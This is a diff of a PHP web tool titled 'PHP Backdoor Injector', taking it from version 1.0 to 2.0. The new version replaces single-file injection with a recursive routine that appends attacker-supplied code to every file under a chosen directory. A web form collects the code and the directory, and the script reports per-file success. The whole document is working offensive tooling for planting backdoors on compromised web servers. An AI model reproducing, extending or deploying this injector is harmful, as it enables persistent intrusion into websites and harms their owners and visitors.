@@ -1,21 +1,29 @@
 <?php
 /*
-        PHP Backdoor Injector v.1.0
+        PHP Backdoor Injector v.2.0
     @Author : 74nc0x
     @Github : http://github.com/soracyberteam/
     @Date   : 22/Dec/2018
     Recode? jancuk kon.
 */
-function inject($file,$code){
-$fh=fopen($file,a);
-if(fwrite($fh,"$code")){
-echo "<script>alert('Success Injected!');</script>";
+function inject($dir,$code){
+$scan=scandir($dir);
+$base=basename($_SERVER['PHP_SELF']);
+foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
+$new="$dir/$file";
+inject($new,$code);
+}else{
+echo "<body bgcolor='black'><font color='white'>";
+$fh=fopen("$dir/$file",a);
+if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
+}
+}
 fclose($fh);
-}else{echo "<script>alert('Forbidden!');</script>";}
+echo "<script>";
 }
 if(isset($_POST['inject'])){
-$filename=$_POST['filename'];$code=$_POST['74nc0x'];
-inject($filename,$code);
+$dir=$_POST['dir'];$code=$_POST['74nc0x'];
+inject($dir,$code);
 }
 ?>
 <?php
@@ -54,10 +62,10 @@ fwrite($fh,"$fu");
 fclose($fh);
 ?>';
 }
-$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector</title>
+$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2</title>
 <center><body bgcolor='black'><pre>
 <font color='white' size='4'>
-<font color='red'>[</font> PHP Backdoor Injector <font color='red'>]</font>
+<font color='red'>[</font> PHP Backdoor Injector v2 <font color='red'>]</font>
 <form action='' method='POST'>
 Code To Inject
 
@@ -65,7 +73,7 @@ Code To Inject
 
 <textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>
 
-File Name : <input type='text' name='filename' placeholder='wp-login.php'>
+Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>
 
 <input type='submit' name='inject' value='Inject'></form>
 
